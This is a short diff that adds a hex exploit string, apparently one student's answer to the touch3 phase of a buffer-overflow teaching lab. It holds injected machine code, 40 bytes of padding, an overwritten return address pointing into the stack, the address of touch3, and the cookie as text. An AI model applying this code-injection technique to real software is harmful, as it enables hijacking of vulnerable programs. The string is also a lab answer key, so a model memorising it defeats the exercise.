@@ -1,0 +1,8 @@
+48 c7 c7 60 7c 63 55 c3 /* bytes for my assembly code */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* 40 char overflow */
+28 7c 63 55 00 00 00 00 /* address of %rsp */
+fb 13 40 00 00 00 00 00 /* address of touch3 */
+33 30 36 66 66 35 35 38 /* cookie converted to text */
